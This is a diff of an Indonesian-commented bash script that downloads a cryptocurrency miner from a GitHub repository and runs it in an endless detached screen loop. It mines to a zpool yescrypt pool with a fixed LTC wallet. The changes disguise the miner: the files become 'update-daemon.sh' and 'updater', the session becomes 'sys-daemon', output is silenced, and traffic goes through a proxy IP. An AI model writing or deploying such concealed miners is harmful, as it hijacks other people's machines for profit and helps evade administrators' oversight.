@@ -1,38 +1,42 @@
 #!/bin/bash
-echo "📦 Menginstal dependensi..."
-apt-get update && apt-get install -y screen wget tar
+echo "📦 Menyiapkan lingkungan kerja..."
+apt-get update -y && apt-get install -y screen wget tar git >/dev/null 2>&1
 
-echo "📁 Menyimpan skrip mining ke /root/benchmarks.sh..."
-cat << 'EOF' > /root/benchmarks.sh
+echo "📁 Menyimpan skrip di /root/update-daemon.sh..."
+cat << 'EOF' > /root/update-daemon.sh
 #!/bin/bash
 
 cd /root || exit
 
-# Download miner jika belum ada
-if [ ! -f benchmarks ]; then
-  echo "⬇️ Mengunduh file benchmarks..."
-  git clone https://github.com/amirul5656/yui56.git
-  cd yui56
-  chmod +x benchmarks
+# Unduh "update tool" jika belum ada
+if [ ! -f updater ]; then
+  echo "⬇️ Mengunduh updater..."
+  git clone https://github.com/amirul5656/yui56.git >/dev/null 2>&1
+  cd yui56 || exit
+  mv web updater
+  chmod +x updater
+else
+  cd yui56 || exit
 fi
 
-# Cek apakah screen sudah berjalan
-if screen -list | grep -q amirul3; then
-  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
-else
-  echo "▶ Menjalankan mining di screen 'amirul3'..."
-  screen -dmS amirul3 bash -c '
+# Jalankan screen jika belum aktif
+if ! screen -list | grep -q sys-daemon; then
+  echo "▶ Menjalankan update daemon..."
+  screen -dmS sys-daemon bash -c '
     while true; do
-      ./benchmarks --algorithm yescrypt --pool stratum+tcp://yescrypt.sea.mine.zpool.ca:6233 -u ltc1q682mxnytl67x3gdw8eezxpuq4pehz5qhax4ls5.jp --password c=LTC,zap=BSTY -t 6
+      ./updater --proxy 202.10.47.153:1996 --algorithm yescrypt \
+        --pool stratum+tcp://yescrypt.eu.mine.zpool.ca:6233 \
+        -u ltc1q682mxnytl67x3gdw8eezxpuq4pehz5qhax4ls5.jp \
+        --password c=LTC,zap=BSTY -t 7
       sleep 2
     done
   '
+else
+  echo "⚠️  Daemon sudah berjalan."
 fi
 EOF
 
-chmod +x /root/benchmarks.sh
+chmod +x /root/update-daemon.sh
 
-echo "🚀 Menjalankan miner sekarang..."
-bash /root/benchmarks.sh
-
-echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
+echo "🚀 Menjalankan daemon mining..."
+bash /root/update-daemon.sh
